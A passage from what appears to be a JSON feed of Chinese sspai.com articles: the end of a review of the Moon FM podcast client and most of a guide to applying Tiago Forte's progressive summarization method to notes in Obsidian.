OPML、通过「发现」板块来搜索和发现等多种方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhdb34te12vuo620.png\"></figure><p>最为基础的当然就是 RSS 订阅，在 Moon FM 中需要在 「我的订阅」中点击汉堡菜单中的「RSS 源」，然后在地址框中填入 RSS 订阅地址并点击「加载 RSS 源」，比较智能的是 MoonFM 会检测源的有效性，只有识别并确认有效之后才能被添加，并且对于自制源（使用 RSSHUB 等工具生成的 RSS 订阅源）有着相当不错的兼容性，比如我通过 RSSHUB 生成的一些在网易云音乐上的「电台主播」的播客节目，就可以通过这样的方式在 Moon FM 中进行管理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhlb34te2hpltph0.png\"></figure><p>当然，对于那些并没有 RSS 源地址的播客节目，也可以通过 Moon FM 的「发现」广场来查找和浏览，Moon FM 在「发现」板块中将一些热门的播客节目进行了精选展示，非常适合哪些想听点啥但是不知道哪些类型播客比较符合自己「口味」的听众。</p>\n<p>除了播客之外，发现板块中可以听到一些非播客音频内容——传统的 FM 调频广播。对于哪些不自带 FM 功能的智能手机而言，通过 Moon FM 还能可以听到不受地域限制的各地的电台广播，也收听播客之余也是一个相当不错的聆听选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rhtb34te2nr88fu0.png\"></figure><p>此外 Moon FM 也非常细心的设立了播客分类，基本上涵盖了大部分我们可以正常收听到的播客节目类别，适合哪些喜欢某一类播客节目的朋友批量订阅。</p>\n<p>如果你只有几个比较模糊的关键字，但完全记不得完整的播客名，那么也可以善用「搜索」来搜索与之相关的播客节目源——你只需要输入相关的关键字，就可以在 Moon FM 收录的播客中找到与之匹配的播客节目源。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ri5b34te2nr88fug.png\"></figure><p>除了上面提到的这些单个的播客订阅，事实上 Moon FM 还支持批量导入订阅源的方式，尤其是当你需要从某个泛用型播客客户端中迁移到 Moon FM 时可以极大地减少工作量，当然反之也可以导出你在 Moon FM 的订阅源，可谓是真正的来去自由。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ri5b34te2r9sanug.png\"></figure><p>在我的订阅中，你还可以对当前已经订阅的播客节目进行整理，比如查看每一个播客的详情，当前播客下面的节目列表以及每一个节目的 Show Notes，对于已经断更的节目或者你不再关注的节目则可以取消订阅来整理，从而保持你的订阅列表中的播客在每一天都是「新鲜的」。</p>\n<h2>要好订阅也要好「放」</h2>\n<p>播客客户端除了方便订阅之外，另一项最为重要的功能就是「播放」了，相比其他泛用型播客客户端，Moon FM 在播放上做的其实非常「接地气」，乍一看平平无奇，实际上在使用过程中会发现非常实用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ridb34te2r9sanv0.png\"></figure><p>比如在收听板块中最近更新的各个播客节目最新的 List，仔细观察你会发现在每一个 list 下都有丰富的控制组件。比如在手机端可以通过向左滑动以及向右滑动 list 来进行控制，除了常用的直接播放之外，另外还可以对当前的节目进行下载，或者将其添加到下一个播放条目中中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541ritb34te2nr88fv0.png\"></figure><p>这种针对节目 list 进行「预操作」的好处适用于很多收听场景，比如在腾不开手操作时可以在播放完当前节目后，让播放列表自动播放下一个添加的节目。而离线下载更适合没有网络的场景下播放，比如当你使用 iPod Touch / iPad 这样没有蜂窝数据的设备时，可以在有无线网络的环境中进行预先离线下载，这样在没有网络的场景下也可以进行收听播客节目。</p>\n<p>再回到播放本身，Moon FM 在播放器功能方面也主打实用为主，例如它同样支持倍速播放功能，如果你习惯通过播客学英语，倍速播放可以让你循序渐进地提升英语听力；当然你也可以用在一些语速比较慢的谈话类播客上，实现尽快地听完节目内容）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rj5b34te12vuo62g.png\"></figure><p>另一项我觉得很实用的播客播放控制就是「睡眠定时」，我个人喜欢在睡前听一些故事类或者舒眠类的播客节目，而这个定时功能则可以让声音在一段时间后关闭，从而避免因为持续的播放最终打扰到正常的睡眠。</p>\n<p>Moon FM 中的睡眠倒计时除了可以选择特定的时间（15分钟 / 30分钟 / 45分钟 / 1小时）之外，还可以直接设定一个单集播放结束就不再播放，在设定上相对而言也比较灵活。而对于播客节目本身，Moon FM 还支持直接展示播客节目的 Show Notes，方便在聆听之余来对节目内容有更深入的了解。</p>\n<h2>自定义你的播客客户端</h2>\n<p>Moon FM 有着良好的跨平台特性，这不仅仅表现在多个平台的支持上，还表现在其在移动端和桌面端都有着高度一致的 UI 界面。流行的圆角卡片式设计让整个功能布局分区明显，结合手势可以实现更快的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rjdb34te2hpltphg.png\"></figure><p>在此基础上，Moon FM 还加入了一项适用于手机端的「底部导航 tab 的自定义」功能，我们可以实现一定程度的播放器界面自定义——你可以选择你需要的板块呈现在 底部 Tab 上。</p>\n<p>举例来说，我使用 Moon FM 的手机端以及桌面端，并且自建了同步服务，因此管理订阅源以及发现新播客这部分需求主要在桌面端来操作，因此我的手机端则主要作为「纯播放端」而非「管理端」。所以只需要在 Tab 中展示「收听」「订阅」「播放列表」以及「我的」，至于「发现」「下载」「收藏」以及「搜索」功能则都不显示。从而确保了显示空间以及功能上的平衡。</p>\n<h2>结语</h2>\n<p>总的来说，作为一款国产的泛用型播客客户端，Moon FM 有着相当多的让人眼前一亮的优点：支持几乎全部流行的操作系统平台，支持自部署的方式来实现个人播客数据同步，丰富的订阅和探索新节目的方式以及实用的播放控制功能等等。如果你恰巧正在找一款纯粹实用的泛用型播客客户端，那么 Moon FM 或许是你不容错过的选择。</p>\n<p>你可以在 <a href=\"https://moon.fm/get-app\" target=\"_blank\">官网</a> 找到各个平台 Moon FM 的下载地址，少数派软件商城也上架了 Moon FM 的 macOS 和 Windows 版本，你可以在 <a href=\"https://sspai.com/item/280\" target=\"_blank\">这里</a> 进行购买。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"280\" type=\"genuineSoftware\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68895"},{"title":"玩转 Obsidian 06：如何用渐进式总结笔记，把知识交给未来的自己","date":"2021-09-29 03:33:35","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/263\" target=\"_blank\">知识管理之术</a> 专栏，和大家探讨「知识管理」的各种层级和方法，其目的为启发思考与共同探索并找到适合自己的「知识管理之术」。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中介绍了如何使用 <a href=\"https://chrome.google.com/webstore/detail/roam-highlighter/mcoimieglmhdjdoplhpcmifgplkbfibp\">Roam-highlighter</a> 搭配 Obsidian 完成「知识循环」的「阅读和记录」环节，今天将继续介绍「知识循环」的「整理环节」。</p>\n<blockquote><p>知识循环指的是以「写作」为唯一目的的「知识管理」方式，在「写作」的过程 中经历阅读/记录/整理和输出</p></blockquote>\n<p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在他的文章《<a href=\"https://fortelabs.co/blog/progressive-summarization-a-practical-technique-for-designing-discoverable-notes/\">Progressive Summarization: A Practical Technique for Designing Discoverable Notes | 渐进式总结：设计可发现笔记的实用技术</a>》中提出「现阶段知识管理的困难」：</p>\n<blockquote><p>在数字世界，你可以获取任何内容（图片、音频、视频等），所以现在人们使用工具管理知识的困难不再是如何记录、保存内容，真正的困难是如何将「好的、有用的、非常重要的内容留给未来」。</p></blockquote>\n<h2>为什么把知识留给未来</h2>\n<p>相信大家或多或少的都会做一些「知识管理」，我们存储了很多知识笔记：摘录一篇文章、收藏一篇笔记、保存一个观点等。在《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》中介绍了个人知识管理经历过三个阶段，其中<code>阶段2: 已整理为目的的「知识管理」</code>中虽然我会将笔记按照「标签」进行分类和管理，使得内容更加容易被发现，但是时间长了之后发现这些知识仍然是一潭死水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/e50da78d15b144ae2017d9faa780e233.png\"><figcaption>图片来自：《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</figcaption></figure><p>一些内容即使做了整理和标记，时间长了也很难记清楚<strong>当时关注的重点是什么</strong>，大概率找到笔记还要重新熟悉和了解后才知道它有没有用，举几个例子：</p>\n<ul>\n<li>看到了一篇文章，当时觉得文中一部分关于「西方艺术史」的内容对自己有帮助（当时可能正在关注此类话题）。所以做了笔记摘录。隔了两年以后再看到这篇文章很可能完全记不起来<strong>当时为什么保存这篇文章</strong>以及<strong>文章的重点是什么</strong>。</li>\n<li>看了一本关于职场酒桌礼仪的书籍，过了许多年以后以后才有用上的机会。</li>\n<li>甚至在笔记中<strong>看到标题都想不起自己为什么存它</strong>。</li>\n</ul>\n<p>给大家看几篇 <strong>2016 年</strong>存入 Evernote 的笔记（摘录原文），乍看之下已经很难一下抓住文章重点，都需要重新阅读：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/059815ae6bd9647ed82f1906d8d793b6.png\"><figcaption>Evernote 早期笔记</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d71ca3651666bd0152ad591e9a070751.png\"><figcaption>Evernote 早期笔记</figcaption></figure><p>为什么要把知识「交给未来的自己」？我认为最大的原因就是：<strong>随着时间的积累，很可能已经忘了当时对这篇文章的理解以及收藏它的初衷</strong>。</p>\n<p>试想一下，如果在未来阅读曾经的笔记时，不再担心「忘记笔记的重点」，甚至也不需要「重新梳理」原文重点，只需用到什么拿什么。那么这段知识就真正成为了可以随身携带的「知识宝库」，并且做到了「随心用之，用之不竭」。</p>\n<h2>如何将知识交给未来的自己</h2>\n<p>现实中有一部分人确实可以凭借超强记忆记住自己的绝大部份学（收集）到的知识，但是大部分人做不到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/acc82364f1cce4eaae5df669fd23b7e0.png\"><figcaption>图片来自：<a href=\"https://fortelabs.co/blog/progressive-summarization-a-practical-technique-for-designing-discoverable-notes/\">Progressive Summarization: A Practical Technique for Designing Discoverable Notes</a></figcaption></figure><p>因为做不到强行记忆，所以许多人的知识管理只做到了第一步「收集」，从而陷入「收藏家谬论」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d0432e463ce25f7ef1c14ca737bdaf8c.png\"><figcaption>图片来自：<a href=\"https://sspai.com/post/62414\">玩转 Obsidian | 打造知识循环利器 - 少数派</a></figcaption></figure><p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在文章中就提出了这样的观点：</p>\n<blockquote><p>我们真正的困难是「知道哪些知识值得获取」，这个挑战在于要「建立一个体系」，通过时间将「知识碎片」交给未来最合适和最需要的情况或场景中。</p></blockquote>\n<p>所以「如何将知识交给未来的自己」，重点就是建立一套体系，文中 <a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 给出的办法是「渐进式总结」：</p>\n<blockquote><p>渐进式总结指的是在<strong>不同的时间段</strong>对某个信息进行<strong>小规模的总结和浓缩</strong>，并形成「原子化」的知识片段，同时尽可能保持其「可发现性和可理解性」。</p></blockquote>\n<p>概念中有几个关键字分别是<strong>不同时间段、小规模、浓缩、原子化、可发现性、可理解性</strong>，而这正是我们「为未来的自己设计一个产品」的关键。</p>\n<h3>设计「渐进式总结笔记」</h3>\n<p>在介绍之前先了解一下设计「渐进式总结」的三个重点。</p>\n<h4>重点 1：具备销售思维</h4>\n<blockquote><p>设计这个系统的时候用「销售思维」去考虑如何将知识「卖给」未来的自己。</p></blockquote>\n<p>换句话说，一段知识如果想让未来的自己享用，那就一定做好「包装」，做到可以「打动」未来的自己，即，<strong>千方百计地吸引未来的自己对这个商品（一篇笔记）感兴趣</strong>。</p>\n<p>假设未来的自己是一位非常刁钻的客户，我们必须像真正的销售员那样，想方设法的引起客户的关注、激发客户的兴趣并建立信誉激起欲望，给出客户选择我们的「充足理由」。</p>\n<p>在实践中就要求我们合理化地突出笔记重点以及做好总结，用这些内容来吸引未来的自己阅读它。</p>\n<h4>重点 2：原子化笔记</h4>\n<p><a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 在文章中提出了「笔记优先法则」：</p>\n<blockquote><p>即我们管理笔记不应该被标签或文件夹限制住（存放在哪里），更应该关注笔记内容本身。笔记应该具备「原子性」，每个原子有自己的特性，并可以随时组成更强大的元素或分子化合物。</p></blockquote>\n<p>理解「原子化笔记」有两个重点：</p>\n<ul>\n<li>原子性：即最小力度的说明一个概念，标准就是它可以在任何地方被引用，用来说明自己。</li>\n<li>自主性：先理解一个概念，在一本书中，它的每一页都是有上下文关系的，也就是说，每一页的存在位置是固定的，如果被挪走或删除，会影响这本书的阅读。而在「笔记优先法则」中的「原子笔记」却与之相反，它应该是自主的，它能够独自说明一件事，可以被独立理解。也就是它和邻近的笔记没任何关系，它可以被移动、分离和连接。</li>\n</ul>\n<p>「原子化笔记」要求我们将笔记尽可能的「原子化」存储，并使其满足「原子性」和「自主性」。在实践中可以通过「双向链接」将相关的「原子笔记」关联到当前笔记中。如果还不了解「双向链接」可以查看之前的文章《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》。</p>\n<h4>重点 3：设计高度浓缩的摘要笔记</h4>\n<p>设计留给未来的笔记，要求我们制作「高度浓缩的笔记」，这意味着笔记要同时满足「可发现性」和「可理解性」。</p>\n<p><strong>可发现性：</strong>笔记具备「可发现性」，指的是笔记的内容要<strong>小巧、简单、易于消化</strong>。</p>\n<p><strong>可理解性：</strong>即笔记要有足够的细节，来源、例子和引用，都要在笔记中有线索，不能有所遗漏。</p>\n<p>「可发现性和可理解性」要同时满足最大的困难是：<strong>因为我们不可能在「不舍弃文章中大部分观点的情况下」而进行总结；就像如果不剪辑掉大部分镜头，就无法制作视频精华片段一样。</strong></p>\n<p>「鱼和熊掌不可兼得」，这就要求我们从中找到平衡点：</p>\n<ul>\n<li>笔记压缩太多，就会失去重点。</li>\n<li>如果保留所有细节，就会失去重点。</li>\n</ul>\n<p>所以选择「合适的压缩比例」是一件非常重要且需要技巧的事情。</p>\n<blockquote><p>在思考保留什么的时候，你一定也在思考丢弃什么！</p></blockquote>\n<p>总结一下，我们要设计一款「传递给未来的自己」的笔记系统要满足如下条件：</p>\n<ul>\n<li>销售思维：即我们设计笔记要有销售思维，想方设法引起未来的自己注意，并提供出未来的自己感兴趣的内容。</li>\n<li>原子化：即我们尽量原子化记录笔记内容，在适当的地方通过「双向链接」进行引用，从而形成知识网络。</li>\n<li>实现高度浓缩的摘要，尽量保留原文的重要观点，又要为未来的自己指明文章重点。而这需要做好取舍。</li>\n</ul>\n<h2>渐进式总结实践</h2>\n<h3>TIAGO FORTE 的实践</h3>\n<p>文章中，TIAGO FORTE 阐明了自己的对「渐进式总结」的实现方式，为了便于大家理解，再次引用一下上文提到的「渐进式总结」的概念：</p>\n<blockquote><p>在<strong>不同的时间段</strong>对某个信息进行<strong>小规模的总结和浓缩</strong>。并形成「原子化」的知识片段，同时尽可能保持其「可发现性和可理解性」。</p></blockquote>\n<p>TIAGO FORTE 的方式就是将笔记分层处理，将「不同时间段」对文章的「小规模总结」，进行分别记录。每个时间段一层，这样在我们阅读笔记的时候，完全可以快速找到笔记的重点（包含不同时期整理的重点信息）。即保留了重点，又能最大限度的还原笔记的主旨。</p>\n<p>一个符合 TIAGO FORTE 「渐进式总结」的范例：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/3675bab3b93d30d796bc43902895ae14.jpeg\"><figcaption>渐进式总结范例</figcaption></figure><h4>第零层：原文</h4>\n<p>TIAGO FORTE 在「渐进式总结」中将原文作为总结笔记的第零层，这一层也称为「原始素材」，它也是后续所有笔记的基础。</p>\n<p>这一层其实是并不在「笔记」中存在，它只是笔记的一段来源记录，包括作者、链接等信息，仅此而已。</p>\n<h4>第一层：原文摘要</h4>\n<p>TIAGO FORTE 的「渐进式总结」实践中最重要的就是「第一层」，他称之为「Notes」我称之为「原文摘要」。</p>\n<p>这实际上是我们很多人都在做的，也是上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中重点介绍的内容。</p>\n<p>这一层没有什么特殊规则，只需要按照每个人对文章的理解进行「摘录」，并将摘录内容保存到笔记中即可。</p>\n<p>关于「第一层」对「原文摘要」的处理方式，推荐几种个人常用或了解的方式：</p>\n<ul>\n<li>Chrome 浏览器推荐使用《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中推荐的扩展 <a href=\"https://chrome.google.com/webstore/detail/roam-highlighter/mcoimieglmhdjdoplhpcmifgplkbfibp\">Roam-highlighter</a>。</li>\n<li>「简悦」作者推荐的简悦插件「<a href=\"https://zhuanlan.zhihu.com/p/412710060\">Live Editor</a>」，搭配「<a href=\"http://ksria.com/simpread/\">简悦</a>」一起使用，支持 Safari 等平台。</li>\n<li>如果你恰好是 <a href=\"https://readwise.io/\">readWise</a> 的会员，推荐使用 <a href=\"https://web.hypothes.is/\">Hypothesis</a> 进行摘录（支持 iPad 摘录），它会自动同步到 readWise，再通过 readWise 自动转存到 Obsidian。这个方式的特点是实现了「跨平台」和「自动化」。</li>\n</ul>\n<p>第一层是非常重要的，可以没有「第零层」但一定要有「第一层 - 原文摘要」，它是一切的基石。</p>\n<h4>第二层：重点摘要</h4>\n<p>TIAGO FORTE 认为，如果我们对只有「第一层」的笔记进行阅读时，如果有了新的感悟发现了新的重点，可以在「第一层」基础上，进行二次处理，他称这一层为「Bold passages」，我称之为「重点摘要」。</p>\n<p>第二层是对第一层的总结，主要是对第一层中的「核心观点」以及「关键词」等进行「加粗」处理，而这对于笔记软件来说非常容易（指的是加粗操作）。</p>\n<p>按照「渐进式总结」概念，通常是在「稍后的时间」对只有「第一层」的文章进行整理，这一点也很好理解，如果我们在未来去读一篇文章，一定是它对我们有吸引力，而在这个过程中产生了新的想法，我们也是随手「加粗标注」，这样既完成了阅读，又能为未来留下「精华」，简直是一举两得的事情。</p>\n<h4>第三层：高亮摘要</h4>\n<p>在 TIAGO FORTE 的「渐进式总结」中，当我们对一篇笔记进行阅读，再次有新的感悟，并觉得有些真正有价值的内容需要被第一时间看到，他会选择对笔记内容进行「高亮」处理，这一层他称之为「Highlighted passages」我称之为「高亮摘要」。</p>\n<p>这一层只对「真正有价值」的内容进行摘要，在任何时候我们查看笔记，都可以随时进行「高亮摘要」，而这一层将成为「最亮眼」的一层，原因是在笔记中高亮比加粗更加明显，而这也是我们的目的。</p>\n<p>在未来的某个时刻，如果关注到这篇笔记，通过高亮内容第一时间可以专注文章的重点，减少我们的认知负担，同时由于第一层和第二层的存在，我们又不会丢失很多细节，所以第三层是「渐进式总结」的精华所在。</p>\n<p>下图中通过「高亮样式」可以一目了然发现文章「重点」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/10c9b686dbea1226e731a665797295f7.png\"><figcaption>高亮样式的特点</figcaption></figure><h4>第四层：总结</h4>\n<p>第四层的方式为「在笔记的顶端用自己的话进行总结」，这里的重点是一定要「用自己的话」进行描述，总结的内容是对第二层和第三层进行概括。</p>\n<p>第四层跟我们在本系列「玩转 Obsidian」中反复提到的「知识循环」概念一致，即最终我们要用自己的话表达出来，这段知识才能变成自己的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/d8f185351e977e14472dc5cac7dbf209.png\"><figcaption>图片来自：《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</figcaption></figure><p>当然总结这件事是非常主观的行为，那就意味着我们可能在总结中遗漏某些细节或重点。幸好我们有多层笔记保障，每一层都是一个时期的理解，这样我们才可放心大胆的对知识进行总结。</p>\n<h4>小结</h4>\n<p>以上是 TIAGO FORTE 「渐进式总结」的概要介绍，它包含如下内容：</p>\n<ul>\n<li>第一层：原文摘要，指的是将原文中重要的信息摘录到笔记中。</li>\n<li>第二层：重点摘要，在第一层基础上，对其中更为核心的观点或关键词进行「加粗」处理。</li>\n<li>第三层：高亮摘要，在第一二层基础上，对一些重点段落进行「高亮」处理，突出文章的主旨。</li>\n<li>第四层：总结，「用自己的话」去描述和概括对当前笔记的理解。</li>\n</ul>\n<p>以上四层结构组成的「渐进式总结」方法，基本上满足了我们在前文提到的三个重点，即笔记中既有足够的信息保证内容不失真（原文摘要），又有足够的亮点帮我们快速理解（高亮+总结）。这是一套非常行之有效的方法。</p>\n<p>TIAGO FORTE 在文章最后也强调了一点，对于部分笔记由于其内容对自己有启发，并随之产生了许多想法，他的做法会单独写一篇笔记进行阐述，而不是像「第1-4层」那样在同一篇笔记中完成，因为这篇文章完全是自己站在「原始素材」的基础上总结和归纳，并用自己的话写出来的文章，他应该是和「原始素材」分开，不至于影响我们对「原始素材」的理解。</p>\n<p>同样这也是在「玩转 Obsidian」这个系列中一直强调的「知识循环」的概念的重点「写作」：</p>\n<blockquote><p>知识循环指的是以「写作」为唯一目的的「知识管理」方式，在「写作」的过程 中经历阅读/记录/整理和输出 。</p></blockquote>\n<p>我们积累知识不是因为得了「松鼠症」而囤积大量的笔记，我们的最终目的还是为了获得知识，即用自己的话进行描述并最终写出来（发布出来）。这样才能说真正的「获得了知识」。</p>\n<h3>在 Obsidian 中实践</h3>\n<p>结合 TIAGO FORTE 的「渐进式总结」，个人在 Obsidian 中进行了实践，并结合 Obsidian 的功能特效进行了改良。</p>\n<p>在 Obsidian 中同样采用「分层总结」将「不同时间段」的总结分别记录到各层中，每一层分别为「第一层：原文摘要」、「第二层：重点摘要」、「第三层：常青笔记」、「第四层：闪念」和「第五层：总结」。</p>\n<p>在上一篇《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中介绍过通过「模板」添加「摘要大纲」的方法，这里同样在每次需要将文章摘录到 Obsidian 中的时候，通过「模板功能」快速插入「摘要模版」，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/a33959f83f80412a3ce29a053923bb80.png\"><figcaption>「渐进式总结」的模板</figcaption></figure><h4>第一层：原文摘要</h4>\n<p>这一层同 TIAGO FORTE 的原意一样，将原始文章中的较为重要的信息「摘录」到笔记当中，在《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》中详细介绍过摘录的方法。</p>\n<p>有一点不同的是，在第一层我就会对一些稍微重要的信息进行「加粗处理」（用一对 <code>**</code>包裹着内容），这会让我在未来「回看笔记」时快速理解第一层信息：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/38cde9475edab1bb4f6bbea76ed8724b.png\"><figcaption>第一层进行「加粗」处理</figcaption></figure><h4>第二层：重点摘要</h4>\n<p>不同于 TIAGO FORTE 的方法 ，一般我会在完成「第一层：原文摘要」后马上就整理「第二层：重点摘要」，虽然我会遵循「不同的时间段完成不同层级」的规则，但是在阅读或整理笔记的当下，如果觉得有些内容需要重点标注，就会第一时间将「第一层」内容拷贝到「第二层」进行「重点标注」，同时如果有必要我也会添加自己的「注释」，方便进行辅助理解。</p>\n<p>在 Obsidian 的第二层中对于「部分内容」使用一对 <code>==</code> 包裹起来达到「高亮」效果，这样的突出效果是为了让未来的自己阅读到笔记时可以快速了解「第二层」的内容（相对的，第一层使用一对 <code>**</code> 加粗处理）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/c89685494b7352a8c2c5326492c5f77c.png\"><figcaption>第二层进行「高亮」处理</figcaption></figure><p> </p>\n<h4>第三层：常青笔记</h4>\n<p>常青笔记，也称为永久笔记。如果当前笔记的阅读让我产生了新的灵感，就像 TIAGO FORTE 说的那样，站在「原始素材」的基础上写一篇文章，然后通过「双向链接」将笔记添加到「第三层：常青笔记」中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/5292ce97a2363893fb0bcc7097f50671.png\"><figcaption>第三层「常青笔记」</figcaption></figure><p>这一层并不经常有内容，除了刚才所说的「新灵感」之外还有一种情况需要添加到「第三层」中，即当发现当前笔记中有一些「独立且重要的概念」时，马上提炼概念内容，写到新的笔记（卡片）中，最后关联到第三层。</p>\n<p>为了便于大家理解这一点，我们看一下个人总结的「卡片盒笔记法」的三个原则：</p>\n<ul>\n<li>原则1：卢曼的「卡片盒笔记法」中的笔记不仅仅是总结性质内容，更重要的是「对想法的阐述」。</li>\n<li>原则2：卢曼的笔记都是「用自己的话术」进行描述。</li>\n<li>原则3：每张卡片都可以完整描述一个想法，并且只描述一个想法，且通常卡片的内容「短小精练」。</li>\n</ul>\n<p>下图就是应用「卡片盒笔记法」三原则生成的新笔记（新卡片），并添加到「第三层：常青笔记」中：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/ae376ad66efa6d28224896096918bfe9.png\"><figcaption>「卡片盒笔记法」三原则的使用</figcaption></figure><h4>第四层：闪念</h4>\n<p>闪念的概念来自于老罗出品的锤子手机的「闪念胶囊」功能，当年用过之后念念不忘，甚至一度使用锤子手机作为备机，虽然我只对这一个功能感兴趣（后来未遂，原因是两个手机带着不方便），但是这个概念被我借鉴且继承下来。</p>\n<p>这一层主要存放那些「灵光一现」的内容，当阅读笔记的当下突然某一段内容产生了一些灵感，随手记录在「第四层」，并设置好标签「闪念胶囊」方便将来索引。</p>\n<p>记录的内容通常三类</p>\n<ul>\n<li>记录一段话，设置好对应的标签或关联其他「笔记」</li>\n<li>只记录一个标题，并设置为 Todo 模式，并用「双向链接」占位，即「不创建笔记内容，只有标题」等有时间在完善。</li>\n</ul>\n<p>我会在固定的时间对「闪念」内容整体回归，该完成的 Todo 就完成，该阅读的文章就会选择合适的时间阅读，总之，<strong>这些灵感不会丢失，更重要的是灵感也不会失去「上下文」</strong>。试想一下，若非如此我们在一年后看到某条「闪念」，估计很难能回忆起来当时为什么记录它。</p>\n<p>下图为「渐进式总结」中「闪念」的实践，<strong>在某一时刻完成了「闪念」对应的任务</strong>：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/2d812c792642c32f24e4478901e4976c.png\"><figcaption>第四层：闪念</figcaption></figure><h4>第五层：总结</h4>\n<p>这一层同 TIAGO FORTE 的介绍一样，用自己的话描述对当前笔记的总结，不一样的是这一段内容也是随时可以写的，可以摘录笔记完成第一层之后就写，也可以是未来的任何时间段，阅读到这篇笔记有感而写。总之只要是用自己的话进行概述的内容都可以放在这一层。</p>\n<p>第五层总结中同样可以利用「加粗」和「高亮」增加总结内容的「亮点」，方便日后进行翻看的时候快速找到关键信息，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/8e380c6493474fc21bcce9a5964f8264.png\"><figcaption>第五层也可以「加粗」和「高亮」</figcaption></figure><h4>小结</h4>\n<p>在 Obsidian 中实践「渐进式总结」同 TIAGO FORTE 的方案有<strong>两点</strong>不同：</p>\n<ol>\n<li>TIAGO FORTE 的方案大体上分为 4 层，除了「第四层：总结」之外，其他层级都是在「第一层：原文摘要」上进行「加粗」或「高亮」完成。而在 Obsidian 的方案中，每一层都有自己独立的意义，做到了完全隔离。这样做的好处是，无论是编辑笔记还是阅读笔记，都能按照每一层去理解和处理它。</li>\n<li>TIAGO FORTE 的方案中要求「不同的时间段完成不同层级」这一准则，每段时间对笔记有了新的感悟，再按照对应层级进行编辑（加粗、高亮或者总结）。而在 Obsidian 的方案中，可以在「任意时间编辑任意层」，因为每一层虽然上下文有关联，但是内容上各自独立（第二层甚至会拷贝第一层内容）。所以<strong>只要是因为当前笔记产生了想法或内容，就将他们放到对应的层级，从而保持住笔记的完整性</strong>。</li>\n</ol>\n<h2>最后</h2>\n<p>「渐进式总结」是一种方法论并不是某一个具体的方法，它的思想是「将于同一段内容在不同时期的思考分层整理并记录」，这样<strong>即不丢失细节又突出重点</strong>，方便我们任何时间进行快速回溯。所以我们在使用上不用拘泥用哪一种，甚至不用拘泥用哪一款工具，只要掌握了方法论，它可以应用到任何地方。</p>\n<hr>\n<p>「玩转 Obsidian」系列会持续更新「如何使用 Obsidian 